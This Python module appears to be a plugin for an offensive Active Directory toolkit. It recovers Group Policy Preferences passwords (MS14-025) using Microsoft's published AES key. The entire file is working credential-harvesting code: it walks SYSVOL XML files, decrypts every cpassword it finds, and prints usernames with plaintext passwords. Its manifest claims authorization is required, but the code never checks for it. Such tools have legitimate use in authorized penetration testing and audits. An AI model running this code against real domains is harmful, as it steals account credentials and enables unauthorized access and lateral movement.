"""GPP decrypt — Group Policy Preferences cpassword extraction."""
from __future__ import annotations
import base64
import sys
from typing import Any
from Crypto.Cipher import AES

MANIFEST = {
    "capability_id": "adxpl.credential.gpp_decrypt.v1",
    "safety_class": "INFORMATIONAL",
    "requires_authorization": True,
    "side_effects": ["smb_read"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.006"],
}

GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e834cd0e2c3e7ca5c51d19db60ef"
)


def _decrypt_cpassword(cpassword: str) -> str:
    """Decrypt GPP cpassword with known AES-256 key (MS14-025)."""
    pad = len(cpassword) % 4
    if pad:
        cpassword += "=" * (4 - pad)
    encrypted = base64.b64decode(cpassword)
    cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, b"\x00" * 16)
    decrypted = cipher.decrypt(encrypted)
    return decrypted.decode("utf-16-le").rstrip("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10")


def run(args: Any) -> int:
    cpassword = getattr(args, "cpassword", None)
    sysvol_path = getattr(args, "sysvol_path", None)

    if cpassword:
        try:
            plain = _decrypt_cpassword(cpassword)
            print("[+] Decrypted GPP password: {}".format(plain))
            return 0
        except Exception as exc:
            print("[-] Decryption failed: {}".format(exc))
            return 1

    if sysvol_path:
        import xml.etree.ElementTree as ET
        from pathlib import Path
        found = 0
        for xml_file in Path(sysvol_path).rglob("*.xml"):
            try:
                tree = ET.parse(str(xml_file))
                for prop in tree.iter():
                    cp = prop.get("cpassword")
                    if cp:
                        plain = _decrypt_cpassword(cp)
                        user = prop.get("userName", prop.get("runAs", "?"))
                        print("[+] {} → {} : {}".format(xml_file.name, user, plain))
                        found += 1
            except Exception:
                pass
        print("[*] Found {} GPP credentials".format(found))
        return 0 if found > 0 else 1

    print("[!] --cpassword <hash> or --sysvol-path <path> required", file=sys.stderr)
    return 1
